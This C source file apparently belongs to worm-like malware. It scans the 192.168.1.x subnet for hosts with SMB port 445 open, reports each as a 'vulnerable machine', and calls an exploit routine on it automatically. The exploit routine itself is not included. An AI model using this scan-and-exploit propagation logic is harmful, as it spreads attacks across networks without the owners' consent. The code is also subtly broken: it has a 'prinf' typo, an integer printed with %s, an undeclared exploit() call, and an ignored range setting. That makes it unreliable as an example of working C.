#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "config.h"

int check_if_port_open(const char *ip, int port) {
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == -1) {
        printf("[!] Can't create socket");
        return 0;
    }

    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET; /* TCP */
    server.sin_port = htons(port); /* to network byte order */

    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        close(sock);
        prinf("[!] Socket closed");
        return 0;
    }
    close(sock);
    printf("[+] Socket is open");
    return 1;
}

void scan_network() {
    char ip[16];

    printf("[!] Scanning network range %s for open SMB (445) ports...\n", NETWORK_RANGE);

    for(int i = 0; i < 254; ++i) {
        snprintf(ip, sizeof(ip),
            "192.168.1.%d", i
        );

        if(check_if_port_open(ip, 445)) {
            printf("[+] Vulnerable machine found: %s\n", i);
            exploit(ip);
        }
    }
}